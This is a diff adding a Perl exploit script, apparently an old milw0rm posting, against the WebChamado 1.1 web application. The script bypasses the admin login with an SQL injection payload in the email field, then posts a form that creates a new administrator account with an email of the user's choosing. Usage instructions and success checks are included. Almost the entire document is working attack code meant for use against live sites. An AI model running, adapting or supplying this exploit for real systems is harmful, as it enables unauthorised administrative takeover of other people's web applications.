@@ -1,0 +1,105 @@
+#!/usr/bin/perl
+#============================================
+# WebChamado 1.1 Arbitrary Add Admin Exploit
+#============================================
+#
+#  ,--^----------,--------,-----,-------^--,
+#  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+#  `+---------------------------^----------|
+#    `\_,-------, _________________________|
+#      / XXXXXX /`|     /
+#     / XXXXXX /  `\   /
+#    / XXXXXX /\______(
+#   / XXXXXX /           
+#  / XXXXXX /
+# (________(             
+#  `------'
+#
+#AUTHOR : CWH Underground
+#DATE : 12 June 2008
+#SITE : www.citec.us
+#
+#
+#####################################################
+#APPLICATION : WebChamado
+#VERSION     : 1.1
+#DOWNLOAD    : http://downloads.sourceforge.net/webchamado
+######################################################
+#
+#Note: magic_quotes_gpc = off
+#
+#This Exploit will Add user to administrator's privilege and you will get password from email..
+
+
+
+use LWP;
+use HTTP::Request;
+use HTTP::Cookies;
+
+if ($#ARGV + 1 != 3)
+{
+   print "\n==============================================\n";
+   print "  WebChamado 1.1 Arbitrary Add Admin Exploit  \n";
+   print "                                              \n";
+   print "        Discovered By CWH Underground         \n";
+   print "==============================================\n";
+   print "                                              \n";
+   print "                                              \n"; 
+   print "Usage: ./xpl-webchamado.pl <WebChamado URL> <user> <email>\n";
+   print "Ex. ./xpl-webchamado.pl http://www.target.com/WebChamado/ cwhunderground cwh\@cwh.com\n";
+   exit();
+}
+
+$cmsurl = $ARGV[0];
+$user = $ARGV[1];
+$mail = $ARGV[2];
+
+
+$loginurl = $cmsurl."admin/index.php";
+$adduserurl = $cmsurl."admin/corpo.php?menuadmin_responsavel=S&rsp_tipusr=U";
+$post_content = "rsp_tipusr=U&rsp_nome=".$user."&rsp_codund=01&rsp_coddep=31&rsp_codfun=46&rsp_eml=".$mail."&rsp_adm=1&rsp_mst=S&rsp_btnresponsavel=Confirmar";
+
+print "\n..::Login Page URL::..\n";
+print "$loginurl\n";
+print "\n..::Add User Page URL::..\n";
+print "$adduserurl\n\n";
+
+$ua = LWP::UserAgent->new;
+$ua->cookie_jar(HTTP::Cookies->new);
+
+$request = HTTP::Request->new (POST => $loginurl);
+$request->header (Accept-Charset => 'ISO-8859-1,utf-8;q=0.7,*;q=0.7');
+$request->content_type ('application/x-www-form-urlencoded');
+$request->content ('eml=\') or 1=1/*&pas=masteradm&btn=Enviar');
+
+$response = $ua->request($request);
+
+$content = $response->content;
+
+if ($content =~ /index_ok/)
+{
+   print "Login Success !!!\n\n";
+}
+else
+{
+   print "Login Failed !!!\n\n";
+   exit();
+}
+
+$request = HTTP::Request->new (POST => $adduserurl);
+$request->content_type ('application/x-www-form-urlencoded');
+$request->content ($post_content);
+$response = $ua->request($request);
+
+$content = $response->content;
+
+if ($content =~ /$user.*ADM.*$mail/)
+{
+   print "Exploit Completed !!!\n";
+}
+else
+{
+   print "Exploit Failed !!!\n";
+}
+
+# milw0rm.com [2008-06-13]
